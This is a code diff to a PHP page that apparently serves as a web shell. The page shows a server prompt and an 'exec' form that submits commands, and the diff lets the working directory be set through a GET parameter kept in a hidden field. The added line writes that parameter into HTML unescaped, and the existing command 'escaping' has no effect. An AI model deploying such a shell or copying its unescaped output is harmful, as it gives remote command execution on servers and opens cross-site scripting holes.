@@ -1,6 +1,7 @@
 <?php
 
 session_start();
+if(isset($_GET['pwd'])) $_SESSION['pwd'] = $_GET['pwd'];
 if(!isset($_SESSION['histo']) || isset($_GET['clear'])) $_SESSION['histo'] = array();
 if(!isset($_SESSION['commands']) || isset($_GET['clear'])) $_SESSION['commands'] = array();
 if(!isset($_SESSION['pwd']) || isset($_GET['clear'])){
@@ -70,7 +71,7 @@ if(isset($_SESSION['pwd'])){
 	echo($_SERVER['SERVER_ADDR'].': '.$_SESSION['pwd'].'$');
 }
 echo('</div>');
-echo('<form method="get"><input style="width:410px;" id="command" name="command" value="" type="text" /><input type="submit" value="exec" /></form>');
+echo('<form method="get"><input style="width:410px;" id="command" name="command" value="" type="text" /><input type="submit" value="exec" /><input type="hidden" name="pwd" value="'.$_SESSION['pwd'].'" /></form>');
 foreach($_SESSION['commands'] as $cmd){
 	echo('<a href="?command='.urlencode($cmd).'">'.str_replace('<', '<', str_replace('>', '>', $cmd)).'</a><br />');
 }
